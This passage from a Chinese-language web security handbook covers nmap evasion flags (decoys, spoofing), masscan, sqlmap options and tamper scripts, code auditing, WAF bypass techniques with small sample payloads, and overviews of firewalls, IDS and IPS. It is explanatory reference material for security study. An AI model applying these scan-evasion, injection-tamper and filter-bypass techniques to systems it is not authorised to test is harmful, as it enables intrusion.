不为版本探测排除任何端口</span></li><li><span>-</span><span>-version-intensity </span><span>&lt;</span><span>intensity</span><span>&gt;</span><span> 设置版本扫描强度</span></li><li><span>-</span><span>-version-light 打开轻量级模式 // 级别 2</span></li><li><span>-</span><span>-version-all 尝试每个探测 // 级别 9</span></li><li><span>-</span><span>-version-trace 跟踪版本扫描活动</span></li><li><span>-sR RPC 扫描</span></li></ul><h4 id='操作系统扫描'><span>操作系统扫描</span></h4><ul><li><span>-O 启用操作系统检测</span></li><li><span>-</span><span>-osscan-limit 针对指定的目标进行操作系统检测</span></li><li><span>-</span><span>-osscan-guess</span></li><li><span>-</span><span>-fuzzy 推测操作系统检测结果</span></li></ul><h4 id='时间和性能'><span>时间和性能</span></h4><ul><li><p><strong><span>调整并行扫描组的大小</span></strong></p><ul><li><span>-</span><span>-min-hostgroup</span><span>&lt;</span><span>milliseconds</span><span>&gt;</span></li><li><span>-</span><span>-max-hostgroup</span><span>&lt;</span><span>milliseconds</span><span>&gt;</span></li></ul></li><li><h4 id='调整探测报文的并行度'><span>调整探测报文的并行度</span></h4><ul><li><span>-</span><span>-min-parallelism</span><span>&lt;</span><span>milliseconds</span><span>&gt;</span></li><li><span>-</span><span>-max-parallelism</span><span>&lt;</span><span>milliseconds</span><span>&gt;</span></li></ul></li><li><h4 id='调整探测报文超时'><span>调整探测报文超时</span></h4><ul><li><span>-</span><span>-min_rtt_timeout </span><span>&lt;</span><span>milliseconds</span><span>&gt;</span></li><li><span>-</span><span>-max-rtt-timeout </span><span>&lt;</span><span>milliseconds</span><span>&gt;</span></li><li><span>-</span><span>-initial-rtt-timeout </span><span>&lt;</span><span>milliseconds</span><span>&gt;</span></li></ul></li><li><h4 id='放弃低速目标主机'><span>放弃低速目标主机</span></h4><ul><li><span>-</span><span>-host-timeout</span><span>&lt;</span><span>milliseconds</span><span>&gt;</span></li></ul></li><li><h4 id='调整探测报文的时间间隔'><span>调整探测报文的时间间隔</span></h4><ul><li><span>-</span><span>-scan-delay</span><span>&lt;</span><span>milliseconds</span><span>&gt;</span></li><li><span>-</span><span>-max_scan-delay</span><span>&lt;</span><span>milliseconds</span><span>&gt;</span></li></ul></li><li><h4 id='设置时间模板'><span>设置时间模板</span></h4><ul><li><span>-T </span><span>&lt;</span><span>Paranoid</span><span>|</span><span>Sneaky</span><span>|</span><span>Polite</span><span>|</span><span>Normal</span><span>|</span><span>Aggressive</span><span>|</span><span>Insane</span><span>&gt;</span></li></ul></li></ul><blockquote><p><strong>–</strong><span> -T</span><span>&lt;</span><span>0-5</span><span>&gt;</span><span> (越大越快)</span></p></blockquote><h4 id='逃避检测相关'><span>逃避检测相关</span></h4><ul><li><span>-f 报文分段</span></li><li><span>-</span><span>-mtu 使用指定的 MTU</span></li><li><span>-D</span><span>&lt;</span><span>decoy1</span><span>[</span><span>，decoy2</span><span>]</span><span>[</span><span>，ME</span><span>]</span><span>，</span><span>.</span><span>..</span><span>&gt;</span><span> 使用诱饵隐蔽扫描</span></li><li><span>-S</span><span>&lt;</span><span>IP_Address</span><span>&gt;</span><span> 源地址哄骗</span></li><li><span>-e </span><span>&lt;</span><span>interface</span><span>&gt;</span><span> 使用指定的接口</span></li><li><span>-</span><span>-source-port</span><span>&lt;</span><span>portnumber</span><span>&gt;</span><span>;-g</span><span>&lt;</span><span>portnumber</span><span>&gt;</span><span> 源端口哄骗</span></li><li><span>-</span><span>-data-length</span><span>&lt;</span><span>number</span><span>&gt;</span><span> 发送报文时附加随机数据</span></li><li><span>-</span><span>-ttl </span><span>&lt;</span><span>value</span><span>&gt;</span><span> 设置 ttl</span></li><li><span>-</span><span>-randomize-hosts 对目标主机的顺序随机排列</span></li><li><span>-</span><span>-spoof-mac</span><span>&lt;</span><span>macaddress，prefix，orvendorname</span><span>&gt;</span><span> MAC 地址哄骗</span></li></ul><h4 id='输出-4'><span>输出</span></h4><ul><li><span>-oN</span><span>&lt;</span><span>filespec</span><span>&gt;</span><span> 标准输出</span></li><li><span>-oX</span><span>&lt;</span><span>filespec</span><span>&gt;</span><span> XML 输出</span></li><li><span>-oS</span><span>&lt;</span><span>filespec</span><span>&gt;</span><span> ScRipTKIdd</span><span>|</span><span>3oUTpuT</span></li><li><span>-oG</span><span>&lt;</span><span>filespec</span><span>&gt;</span><span> Grep 输出</span></li><li><span>-oA</span><span>&lt;</span><span>basename</span><span>&gt;</span><span> 输出至所有格式</span></li><li><span>-</span><span>-open 仅输出可能开放的端口信息</span></li></ul><h4 id='细节和调试'><span>细节和调试</span></h4><ul><li><span>-v 信息详细程度</span></li><li><span>-d </span><span>[</span><span>level</span><span>]</span><span> debug level</span></li><li><span>-</span><span>-packet-trace 跟踪发送和接收的报文</span></li><li><span>-</span><span>-iflist 列举接口和路由</span></li></ul><h3 id='masscan'><span>Masscan</span></h3><h4 id='编译'><span>编译</span></h4><blockquote><p><strong><span>命令行选项</span></strong></p></blockquote><ul><li><span>-</span><span>-ports 指定端口范围</span></li><li><span>-</span><span>-rate 指定速率</span></li><li><span>-</span><span>-source-ip 指定源 IP</span></li></ul><h2 id='sqlmap-使用'><span>SQLMap 使用</span></h2><blockquote><p><span>安装 git clone </span><a href='https://github.com/sqlmapproject/sqlmap.git' target='_blank' class='url'>https://github.com/sqlmapproject/sqlmap.git</a><span> sqlmap</span></p></blockquote><ol start='' ><li><h3 id='常用参数'><span>常用参数</span></h3><ul><li><p><span>-u </span><span>-</span><span>-url 指定目标 url</span></p></li><li><p><span>-m 从文本中获取多个目标扫描</span></p></li><li><p><span>-r 从文件中加载 HTTP 请求</span></p></li><li><p><span>-</span><span>-data 以 POST 方式提交数据</span></p></li><li><p><span>-random-agent 随机 ua</span></p></li><li><p><span>-</span><span>-user-agent 指定 ua</span></p></li><li><p><span>-</span><span>-delay 设置请求间的延迟</span></p></li><li><p><span>-</span><span>-timeout 指定超时时间</span></p></li><li><p><span>-</span><span>-dbms 指定 db，sqlmap 支持的 db 有 MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、SQLite 等</span></p></li><li><p><span>-</span><span>-os 指定数据库服务器操作系统</span></p></li><li><p><span>-</span><span>-tamper 指定 tamper</span></p></li><li><p><span>-</span><span>-level 指定探测等级</span></p></li><li><p><span>-</span><span>-risk 指定风险等级</span></p></li><li><h4 id='--technique-注入技术'><span>-</span><span>-technique 注入技术</span></h4><ul><li><span>B: Boolean-based blind SQL injection</span></li><li><span>E: Error-based SQL injection</span></li><li><span>U: UNION query SQL injection</span></li><li><span>S: Stacked queries SQL injection</span></li><li><span>T: Time-based blind SQL injection</span></li></ul></li></ul></li><li><h3 id='tamper-速查'><span>Tamper 速查</span></h3></li></ol><hr /><p><span>  脚本名称                       作用</span></p><hr /><p><span>  apostrophemask.py              用 utf8 代替引号</span></p><p><span>  equaltolike.py                 like 代替等号</span></p><p><span>  space2dash.py                  绕过过滤</span>’<span>=</span>’<span> 替换空格字符 (</span>“<span>)，(</span>“<span> - </span>’<span>) 后跟一个破折号注释，一个随机字符串和一个新行</span></p><p><span>  greatest.py                    绕过过滤</span>’<span>&gt;</span>’<span> , 用 GREATEST 替换大于号。</span></p><p><span>  space2hash.py                  空格替换为 </span><span>#</span><span> 号随机字符串以及换行符</span></p><p><span>  apostrophenullencode.py        绕过过滤双引号，替换字符和双引号。</span></p><p><span>  halfversionedmorekeywords.py   当数据库为 mysql 时绕过防火墙，每个关键字之前添加 mysql 版本评论</span></p><p><span>  space2morehash.py              空格替换为 </span><span>#</span><span> 号以及更多随机字符串换行符</span></p><p><span>  appendnullbyte.py              在有效负荷结束位置加载零字节字符编码</span></p><p><span>  ifnull2ifisnull.py             绕过对 IFNULL 过滤。替换类似</span>’<span>IFNULL(A, B)</span>’<span> 为</span>’<span>IF(ISNULL(A), B, A)</span>’</p><p><span>  space2mssqlblank.py            空格替换为其它空符号</span></p><p><span>  base64encode.py                用 base64 编码替换</span></p><p><span>  space2mssqlhash.py             替换空格</span></p><p><span>  modsecurityversioned.py        过滤空格，包含完整的查询版本注释</span></p><p><span>  space2mysqlblank.py            空格替换其它空白符号 (mysql)</span></p><p><span>  between.py                     用 between 替换大于号 (</span><span>&gt;</span><span>)</span></p><p><span>  space2mysqldash.py             替换空格字符 (</span>“<span>)(</span>‘<span> - </span>’<span>) 后跟一个破折号注释一个新行 (</span>‘<span> n</span>’<span>)</span></p><h2 id='multiplespacespy--------------围绕-sql-关键字添加多个空格'><span>  multiplespaces.py              围绕 SQL 关键字添加多个空格</span></h2><p><span>下</span></p><h4 id='115-sqlmap-使用-375'><span>11.5. SQLMap 使用 375</span></h4><blockquote><p><span>表 2 </span>–<span> 续上页</span></p></blockquote><hr /><p><span>  脚本名称                     作用</span></p><hr /><p><span>  space2plus.py                用 + 替换空格</span></p><p><span>  bluecoat.py                  代替空格字符后与一个有效的随机空白字符的 SQL 语句。然后替换 = 为 like</span></p><p><span>  nonrecursivereplacement.py   取代 predefined SQL 关键字 with 表示 suitable for 替代 (例如.replace(</span>“<span>SELECT</span>”<span>、</span>“”<span>))</span></p><p><span>  space2randomblank.py         代替空格字符 (</span>“”<span>) 从一个随机的空白字符可选字符的有效集</span></p><p><span>  sp_password.py               追加 sp_password</span>’<span> 从 DBMS 日志的自动模糊处理的有效载荷的末尾</span></p><p><span>  chardoubleencode.py          双 url 编码 (不处理以编码的)</span></p><p><span>  unionalltounion.py           替换 UNION ALL SELECT UNION SELECT</span></p><p><span>  charencode.py                url 编码</span></p><p><span>  randomcase.py                随机大小写</span></p><p><span>  unmagicquotes.py             宽字符绕过 GPC addslashes</span></p><p><span>  randomcomments.py            用 /</span><span>*</span><span>*</span><span>/ 分割 sql 关键字</span></p><p><span>  charunicodeencode.py         字符串 unicode 编码</span></p><p><span>  securesphere.py              追加特制的字符串</span></p><p><span>  versionedmorekeywords.py     注释绕过</span></p><h2 id='space2commentpy-------------replaces-space-character---with-comments-'><span>  space2comment.py             Replaces space character </span><span>&#39;</span><span> </span><span>&#39;</span><span> with comments /</span><span>*</span><span>*</span><span>/</span></h2><p><span id="_bookmark114" class="anchor"></span><span>CHAPTER 12</span></p><p><span>其他</span></p><ol start='' ><li><h2 id='代码审计'><span>代码审计</span></h2><ol start='' ><li><h3 id='简介-45'><span>简介</span></h3></li></ol></li></ol><blockquote><p><span>代码审计是找到应用缺陷的过程。其通常有白盒审计、黑盒审计、灰盒审计等方式。白盒审计指通过对源代码的分析找到应用缺陷，黑盒审计通常不涉及到源代码，多使用模糊测试的方式，而灰盒审计则是黑白结合的方式。三种不同的测试方法有不同的优缺点。</span></p></blockquote><h3 id='常用概念-2'><span>常用概念</span></h3><h4 id='输入'><span>输入</span></h4><blockquote><p><span>输入通常也称 Source，Web 应用的输入可以是请求的参数（GET、POST 等）、上传的文件、Cookie、数据库数据等用户可控或者间接可控的地方。</span></p><p><span>例如 PHP 中的 </span><span>$</span><span>_</span><span>GET / </span><span>$</span><span>_</span><span>POST / </span><span>$</span><span>_</span><span>REQUEST / </span><span>$</span><span>_</span><span>COOKIE / </span><span>$</span><span>_</span><span>FILES / </span><span>$</span><span>_</span><span>SERVER 等，都可以作为应用的输入。</span></p></blockquote><h4 id='处理函数'><span>处理函数</span></h4><blockquote><p><span>处理函数是对数据进行过滤或者编解码的函数，通常被称为 Clean/Filter/Sanitizer。这些函数会对输入进行安全操作或过滤，为漏洞利用带来不确定性。</span></p><p><span>同样以 PHP 为例，这样的函数可能是 mysqli_real_escape_string / htmlspecialchars / base64_encode</span></p><p><span>/ str_rot13 等，也可能是应用自定义的过滤函数。</span></p></blockquote><h4 id='危险函数'><span>危险函数</span></h4><blockquote><p><span>危险函数又常叫做 Sink Call、漏洞点，是可能触发危险行为如文件操作、命令执行、数据库操作等行为的函数。</span></p><p><span>在 PHP 中，可能是 include / system / echo 等。</span></p></blockquote><h3 id='自动化审计-2'><span>自动化审计</span></h3><blockquote><p><span>一般认为一个漏洞的触发过程是从输入经过过滤到危险函数的过程 (Source To Sink)，而审计就是寻找这个链条的过程。常见的自动化审计方案有危险函数匹配、控制流分析等。</span></p></blockquote><h4 id='危险函数匹配'><span>危险函数匹配</span></h4><blockquote><p><span>白盒审计最常见的方式是通过搜寻危险函数与危险参数定位漏洞，比较有代表性的工具是 Seay 开发的审计工具。这种方法误报率相当高，这是因为这种方法没有对程序的流程进行深入分析，另一方面，这种方式通常是孤立地分析每一个文件，忽略了文件之间复杂的调用关系。</span></p><p><span>具体的说，这种方式在一些环境下能做到几乎无漏报，只要审计者有耐心，可以发现大部分的漏洞，但是在高度框架化的代码中，能找到的漏洞相对有限。</span></p></blockquote><h4 id='控制流分析'><span>控制流分析</span></h4><blockquote><p><span>在后来的系统中，考虑到一定程度引入 AST 作为分析的依据，在一定程度上减少了误报，但是仍存在很多缺陷。</span></p><p><span>而后，Dahse J 等人设计了 RIPS，该工具进行数据流与控制流分析，结合过程内与过程间的分析得到审计结果，相对危险函数匹配的方式来说误报率少了很多，但是同样的也增加了开销。</span></p></blockquote><h4 id='基于图的分析'><span>基于图的分析</span></h4><blockquote><p><span>基于图的分析是对控制流分析的一个改进，其利用 CFG 的特性和图计算的算法，一定程度上简化了计算，比较有代表性的是微软的 Semmle QL 和 NDSS 2017 年发表的文章 Efficient and Flexible Discovery of PHP Application Vulnerabilities。</span></p></blockquote><h4 id='代码相似性比对'><span>代码相似性比对</span></h4><blockquote><p><span>一些开发者会复制其他框架的代码，或者使用各种框架。如果事先有建立对应的漏洞图谱，则可使用相似性方法来找到漏洞。</span></p></blockquote><h4 id='灰盒分析'><span>灰盒分析</span></h4><blockquote><p><span>基于控制流的分析开销较大，于是有人提出了基于运行时的分析方式，对代码进行 Hook，当执行到危险函数时自动回溯输入，找到输入并判断是否可用。</span></p><p><span>这种方式解决了控制流分析实现复杂、计算路径开销大的问题，在判断过滤函数上也有一定的突破，但是灰盒的方式并不一定会触发所有的漏洞。fate0 开发的 prvd 就是基于这种设计思路。</span></p></blockquote><ol start='4' ><li><h3 id='手工审计流程'><span>手工审计流程</span></h3><ul><li><h4 id='mediaimage6pngwidth013194444444444445in-height013194444444444445in获取代码确定版-尝试初步分析'><img src="media/image6.png" referrerpolicy="no-referrer"><span>获取代码，确定版 ，尝试初步分析</span></h4><ul><li><span>找历史漏洞信息</span></li><li><span>找应用该系统的实例</span></li><li><span>确定依赖库是否存在漏洞</span></li></ul></li><li><p><span>基于审计工具进行初步分析</span></p></li><li><h4 id='了解程序运行流程'><span>了解程序运行流程</span></h4><ul><li><p><strong><span>文件加载方式</span></strong></p><ul><li><span>类库依赖</span></li><li><span>是否加载 waf</span></li></ul></li><li><h4 id='数据库连接方式'><span>数据库连接方式</span></h4><ul><li><span>mysql/mysqli/pdo</span></li><li><span>是否开启预编译</span></li></ul></li><li><h4 id='视图渲染'><span>视图渲染</span></h4><ul><li><span>XSS</span></li><li><span>模版注入</span></li></ul></li><li><h4 id='session-处理机制'><span>SESSION 处理机制</span></h4><ul><li><span>文件</span></li><li><span>数据库</span></li><li><span>内存</span></li></ul></li><li><h4 id='cache-处理机制'><span>Cache 处理机制</span></h4><ul><li><span>文件 cache 可能写 shell</span></li><li><span>数据库 cache 可能注入</span></li><li><span>memcache</span></li></ul></li></ul></li><li><h4 id='账户体系'><span>账户体系</span></h4><ul><li><p><span>Auth 方式</span></p></li><li><p><span>Pre-Auth 的情况下可以访问的页面</span></p></li><li><h4 id='普通用户的帐号'><span>普通用户的帐号</span></h4><ul><li><span>能否可获取普通用户权限</span></li></ul></li><li><p><span>管理员账户默认密码</span></p></li><li><h4 id='账号体系'><span>账号体系</span></h4><ul><li><p><span>加密方式</span></p></li><li><p><span>爆破密码</span></p></li><li><p><span>重置漏洞</span></p></li><li><h4 id='修改密码漏洞'><span>修改密码漏洞</span></h4></li></ul></li></ul></li></ul></li></ol><blockquote><p><span>· 修改其他账号密码</span></p></blockquote><ul><li><p><strong><span>根据漏洞类型查找 Sink</span></strong></p><ul><li><strong><span>SQLi</span></strong></li><li><strong><span>XSS</span></strong></li></ul></li></ul><p>&nbsp;</p><ul><li><p><span>全局过滤能否 bypass</span></p></li><li><p><span>是否有直接执行 SQL 的地方</span></p></li><li><h4 id='sql-使用驱动mysqlmysqlipdo'><span>SQL 使用驱动，mysql/mysqli/pdo</span></h4></li></ul><blockquote><p><span>· 如果使用 PDO，搜索是否存在直接执行的部分</span></p></blockquote><ul><li><p><span>全局 bypass</span></p></li><li><p><span>视图渲染</span></p><ul><li><h4 id='file-2'><span>FILE</span></h4><ul><li><p><span>查找上传功能点</span></p></li><li><p><span>上传下载覆盖删除</span></p></li><li><h4 id='包含'><span>包含</span></h4><ul><li><span>LFI</span></li><li><span>RFI</span></li><li><span>全局找 include, require</span></li></ul></li></ul></li><li><p><span>RCE</span></p></li><li><p><span>XXE</span></p></li></ul></li></ul><p>&nbsp;</p><ul><li><h4 id='过滤-2'><span>过滤</span></h4></li></ul><p>&nbsp;</p><ul><li><p><span>CSRF</span></p></li><li><p><span>SSRF</span></p></li><li><p><span>反序列化</span></p></li><li><p><span>变量覆盖</span></p></li><li><p><span>LDAP</span></p></li><li><p><span>XPath</span></p></li><li><p><span>Cookie 伪造</span></p></li><li><p><span>找 WAF 过滤方式，判断是否可以绕过</span></p><ol start='' ><li><h3 id='参考链接-参考链接-55'><span>参考链接 {#参考链接-55}</span></h3><ul><li><a href='https://github.com/ripsscanner/rips'><span>rips</span></a></li><li><a href='https://github.com/fate0/prvd'><span>prvd</span></a></li><li><a href='http://blog.fatezero.org/2018/11/11/prvd/'><span>PHP 运行时漏洞检测</span></a></li><li><span>Backes M , Rieck K , Skoruppa M , et al. Efficient and Flexible Discovery of PHP Application Vulnerabilities</span><span>[</span><span>C</span><span>]</span><span>// IEEE European Symposium on Security &amp; Privacy. IEEE, 2017.</span></li><li><span>Dahse J. RIPS-A static source code analyser for vulnerabilities in PHP scripts</span><span>[</span><span>J</span><span>]</span><span>. Retrieved: February, 2010, 28: 2012.</span></li></ul></li></ol><p>&nbsp;</p><ol start='' ><li><h1 id='waf-2'><span>WAF</span></h1><ol start='' ><li><h3 id='简介-46'><span>简介</span></h3></li></ol></li></ol></li></ul><h4 id='概念-2'><span>概念</span></h4><blockquote><p><span>WAF（Web Application Firewall，Web 应用防火墙）是通过执行一系列针对 HTTP/HTTPS 的安全策略来专门为 Web 应用提供加固的产品。</span></p><p><span>在市场上，有各种价格各种功能和选项的 WAF。在一定程度上，WAF 能为 Web 应用提供安全性，但是不能保证完全的安全。</span></p></blockquote><h4 id='常见功能-2'><span>常见功能</span></h4><ul><li><p><span>检测异常协议，拒绝不符合 HTTP 标准的请求</span></p></li><li><p><span>对状态管理进行会话保护</span></p></li><li><p><span>Cookies 保护</span></p></li><li><p><span>信息泄露保护</span></p></li><li><p><span>DDoS 防护</span></p></li><li><p><span>禁止某些 IP 访问</span></p></li><li><p><span>可疑 IP 检查</span></p></li><li><h4 id='安全-http-头管理'><span>安全 HTTP 头管理</span></h4><ul><li><span>X-XSS-Protection</span></li><li><span>X-Frame-Options</span></li></ul></li><li><h4 id='机制检测'><span>机制检测</span></h4><ul><li><span>CSRF token</span></li><li><span>HSTS</span></li></ul></li></ul><h4 id='布置位置'><span>布置位置</span></h4><blockquote><p><span>按布置位置，WAF 可以分为云 WAF、主机防护软件和硬件防护。云 WAF 布置在云上，请求先经过云服务器而后流向主机。主机防护软件需要主机预先安装对应软件，如 mod_security、ngx-lua-waf 等，对主机进行防护。硬件防护指流量流向主机时，先经过设备的清洗和拦截。</span></p></blockquote><h3 id='防护方式'><span>防护方式</span></h3><blockquote><p><span>WAF 常用的方法有关键字检测、正则表达式检测、语法分析、行为分析、声誉分析、机器学习等。</span></p><p><img src="media/image1.png" referrerpolicy="no-referrer"><span>基于正则的保护是最常见的保护方式。开发者用一些设定好的正则规则来检测载荷是否存在攻击性。基于正则的防护较为简单，因此存在一些缺点。例如只能应用于单次请求，而 正则很难应用到一些复杂的协议上。</span></p><p><img src="media/image1.png" referrerpolicy="no-referrer"><span>基于语法的分析相对正则来说更快而 更准确，这种分析会把载荷按照语法解析成的符号组，然后在符号组中寻找危险的关键字。这种方式对一些载荷的变式有较好的效果，但是同样的，对解析器要求较高。</span></p><p><span>基于行为的分析着眼的范围更广一些，例如攻击者的端口扫描行为、目录爆破、参数测试或者一些其他自动化或者攻击的模式都会被纳入考虑之中。</span></p><p><span>基于声誉的分析可以比较好的过滤掉一些可疑的来源，例如常用的 VPN、匿名代理、Tor 节点、僵尸网络节点的 IP 等。</span></p><p><span>基于机器学习的 WAF 涉及到的范围非常广，效果也因具体实现和场景而较为多样化。</span></p><p><span>除了按具体的方法分，也可以根据白名单和黑名单的使用来分类。基于白名单的 WAF 适用于稳定的 Web</span></p><p><span>应用，而基于黑名单则适合处理已知问题。</span></p></blockquote><ol start='3' ><li><h3 id='扫描器防御'><span>扫描器防御</span></h3><ul><li><span>基于 User-Agent 识别</span></li><li><span>基于攻击载荷识别</span></li><li><span>验证码</span></li></ul></li><li><h3 id='waf-指纹-2'><span>WAF 指纹</span></h3><ul><li><span>额外的 Cookie</span></li><li><span>额外的 Header</span></li><li><span>被拒绝请求时的返回内容</span></li><li><span>被拒绝请求时的返回响应码</span></li><li><span>IP</span></li></ul></li><li><h3 id='绕过方式'><span>绕过方式</span></h3></li></ol><h4 id='基于架构的绕过'><span>基于架构的绕过</span></h4><ul><li><span>站点在 WAF 后，但是站点可直连</span></li><li><span>站点在云服务器中，对同网段服务器无 WAF</span></li></ul><h4 id='基于资源的绕过'><span>基于资源的绕过</span></h4><ul><li><span>使用消耗大的载荷，耗尽 WAF 的计算资源</span></li><li><span>提供大量的无效参数</span></li></ul><h4 id='基于解析的绕过'><span>基于解析的绕过</span></h4><ul><li><p><span>字符集解析不同</span></p></li><li><h4 id='协议覆盖不全'><span>协议覆盖不全</span></h4><ul><li><span>POST 的 JSON 传参 / form-data / multipart/form-data</span></li></ul></li><li><p><span>协议解析不正确</span></p></li><li><p><span>站点和 WAF 对 https 有部分不一致</span></p></li><li><h4 id='waf-解析与-web-服务解析不一致'><span>WAF 解析与 Web 服务解析不一致</span></h4><ul><li><span>部分 ASP+IIS 会转换 %u0065 格式的字符</span></li><li><span>Apache 会解析畸形 Method</span></li><li><span>同一个参数多次出现，取的位置不一样</span></li><li><span>HTTP Parameter Pollution (HPP)</span></li><li><span>HTTP Parameter Fragmentation (HPF)</span></li></ul></li></ul><blockquote><p><strong><span>基于规则的绕过</span></strong></p></blockquote><ul><li><p><strong><span>等价替换</span></strong></p><ul><li><p><strong><span>大小写变换</span></strong></p><ul><li><span>select =</span><span>&gt;</span><span> sEleCt</span></li><li><span>&lt;</span><span>sCrIpt</span><span>&gt;</span><span>alert(1)</span><span>&lt;</span><span>/script</span><span>&gt;</span></li></ul></li><li><h4 id='字符编码'><span>字符编码</span></h4><ul><li><span>URL 编码</span></li><li><span>十六进制编码</span></li><li><span>Unicode 解析</span></li><li><span>Base64</span></li><li><span>HTML</span></li><li><span>JSFuck</span></li><li><span>其他编码格式</span></li></ul></li><li><p><span>等价函数</span></p></li><li><p><span>等价变量</span></p></li><li><p><span>关键字拆分</span></p></li><li><p><span>字符串操作</span></p></li></ul></li><li><h4 id='字符干扰'><span>字符干扰</span></h4><ul><li><p><strong><span>空字符</span></strong></p><ul><li><span>NULL (x00)</span></li><li><span>空格</span></li><li><span>回车 (x0d)</span></li><li><span>换行 (x0a)</span></li><li><span>垂直制表 (x0b)</span></li><li><span>水平制表 (x09)</span></li><li><span>换页 (x0c)</span></li></ul></li><li><p><span>注释</span></p></li></ul></li><li><h4 id='特殊符号'><span>特殊符号</span></h4><ul><li><span>注释符</span></li><li><span>引号（反引号、单引号、双引号）</span></li></ul></li><li><h4 id='mediaimage6pngwidth013194444444444445in-height013194444444444445in利用服务-身特点'><img src="media/image6.png" referrerpolicy="no-referrer"><span>利用服务 身特点</span></h4><ul><li><p><strong><span>替换可疑关键字为空</span></strong></p><ul><li><span>selselectect =</span><span>&gt;</span><span> select</span></li></ul></li></ul></li><li><p><span>少见特性未在规则列表中</span></p></li></ul><ol start='6' ><li><h3 id='参考链接-参考链接-56'><span>参考链接 {#参考链接-56}</span></h3><ul><li><a href='https://www.weibo.com/ttarticle/p/show?id=2309404007261092631700&amp;sudaref=www.google.com.hk&amp;display=0&amp;retcode=6102'><span>WAF 攻防研究之四个层次 Bypass WAF</span></a></li><li><a href='https://xz.aliyun.com/t/368'><span>我的 WafBypass 之道 SQL 注入篇</span></a></li><li><a href='https://habr.com/en/company/dsec/blog/454592/'><span>WAF through the eyes of hackers</span></a></li></ul></li></ol><p>&nbsp;</p><ol start='2' ><li><h2 id='常见网络设备'><span>常见网络设备</span></h2><ol start='' ><li><h3 id='防火墙-2'><span>防火墙</span></h3></li></ol></li></ol><h4 id='简介-47'><span>简介</span></h4><blockquote><p><span>防火墙指的是一个有软件和硬件设备组合而成、在内部网和外部网之间、专用网与公共网之间的界面上构造的保护屏障。它可通过监测、限制、更改跨越防火墙的数据流，尽可能地对外部屏蔽网络内部的信息、结构和运行状况，以此来实现网络的安全保护。</span></p><p><img src="media/image1.png" referrerpolicy="no-referrer"><span>防火墙可以分为网络层防火墙和应用层防火墙。网络层防火墙基于源地址和目的地址、应用、协议以及每个 IP 包的端口来作出通过与否的判断。应用层防火墙针对特别的网络应用服务协议即数据过滤协议，并 能够对数据包分析并形成相关的报告。</span></p></blockquote><h4 id='主要功能-1'><span>主要功能</span></h4><ul><li><span>过滤进、出网络的数据</span></li><li><span>防止不安全的协议和服务</span></li><li><span>管理进、出网络的访问行为</span></li><li><span>记录通过防火墙的信息内容</span></li><li><span>对网络攻击进行检测与警告</span></li><li><span>防止外部对内部网络信息的获取</span></li><li><span>提供与外部连接的集中管理</span></li></ul><h4 id='下一代防火墙'><span>下一代防火墙</span></h4><blockquote><p><span>主要是一款全面应对应用层威胁的高性能防火墙。可以做到智能化主动防御、应用层数据防泄漏、应用层洞察与控制、威胁防护等特性。下一代防火墙在一台设备里面集成了传统防火墙、IPS、应用识别、内容过滤等功能既降低了整体网络安全系统的采购投入，又减去了多台设备接入网络带来的部署成本，还通过应用识别和用户管理等技术降低了管理人员的维护和管理成本。</span></p></blockquote><h3 id='ids-2'><span>IDS</span></h3><h4 id='简介-48'><span>简介</span></h4><blockquote><p><span>入侵检测即通过从网络系统中的若干关键节点收集并分析信息，监控网络中是否有违反安全策略的行为或者是否存在入侵行为。入侵检测系统通常包含 3 个必要的功能组件：信息来源、分析引擎和响应组件。</span></p><p><span>信息收集包括收集系统、网络、数据及用户活动的状态和行为。入侵检测利用的信息一般来自：系统和网络日志文件、非正常的目录和文件改变、非正常的程序执行这三个方面。</span></p><p><span>分析引擎对收集到的有关系统、网络、数据及用户活动的状态和行为等信息，是通过模式匹配、统计分析和完整性分析这三种手段进行分析的。前两种用于实时入侵检测，完整性分析用于事后分析。</span></p><p><span>告警与响应根据入侵性质和类型，做出相应的告警与响应。</span></p></blockquote><h4 id='主要类型-1'><span>主要类型</span></h4><blockquote><p><span>IDS 可以分为基于主机的入侵检测系统 (HIDS) 和基于网络的入侵检测系统 (NIDS)。</span></p><p><span>基于主机的入侵检测系统是早期的入侵检测系统结构，通常是软件型的，直接安装在需要保护的主机上。其检测的目标主要是主机系统和系统本地用户，检测原理是根据主机的审计数据和系统日志发现可疑事件。</span></p><p><span>这种检测方式的优点主要有：信息更详细、误报率要低、部署灵活。这种方式的缺点主要有：会降低应用系统的性能；依赖于服务器原有的日志与监视能力；代价较大；不能对网络进行监测；需安装多个针对不同系统的检测系统。</span></p><p><span>基于网络的入侵检测方式是目前一种比较主流的监测方式，这类检测系统需要有一台专门的检测设备。检测设备放置在比较重要的网段内，不停地监视网段中的各种数据包，而不再是只监测单一主机。它对所监测的网络上每一个数据包或可疑的数据包进行特征分析，如果数据包与产品内置的某些规则吻合，入侵检测系统就会发出警报，甚至直接切断网络连接。目前，大部分入侵检测产品是基于网络的。</span></p><p><span>这种检测技术的优点主要有：能够检测那些来自网络的攻击和超过授权的非法访问；不需要改变服务器等主机的配置，也不会影响主机性能；风险低；配置简单。其缺点主要是：成本高、检测范围受局限；大量计算，</span></p><p><span>影响系统性能；大量分析数据流，影响系统性能；对加密的会话过程处理较难；网络流速高时可能会丢失许多封包，容易让入侵者有机可乘；无法检测加密的封包；对于直接对主机的入侵无法检测出。</span></p></blockquote><h3 id='ips入侵防御系统）'><span>IPS（入侵防御系统）</span></h3><h4 id='简介-49'><span>简介</span></h4><blockquote><p><span>入侵防御系统是一部能够监视网络或网络设备的网络资料传输行为的计算机网络安全设备，能够即时的中断、调整或隔离一些不正常或是具有伤害性的网络资料传输行为。</span></p><p><span>串行部署的防火墙可以拦截低层攻击行为，但对应用层的深层攻击行为无能为力。旁路部署的 IDS 可以及时发现那些穿透防火墙的深层攻击行为，作为防火墙的有益补充，但是无法实时的阻断。</span></p><p><span>因此出现了基于 IDS 和防火墙联动的 IPS：通过 IDS 来发现，通过防火墙来阻断。但由于迄今为止没有统一的接口规范，加上越来越频发的</span>“<span>瞬间攻击</span>”<span>（一个会话就可以达成攻击效果，如 SQL 注入、溢出攻击等），使得 IDS 与防火墙联动在实际应用中的效果不显著。</span></p></blockquote><h4 id='主要类型-2'><span>主要类型</span></h4><blockquote><p><span>可以分为基于特征的 IPS、基于异常的 IPS、基于策略的 IPS、基于协议分析的 IPS。</span></p><p><span>基于特征的 IPS 是许多 IPS 解决方案中最常用的方法。把特征添加到设备中，可识别当前最常见的攻击。也被称为模式匹配 IPS。特征库可以添加、调整和更新，以应对新的攻击。</span></p><p><span>基于异常的 IPS 也被称为基于行规的 IPS。基于异常的方法可以用统计异常检测和非统计异常检测。</span></p><p><span>基于策略的 IPS 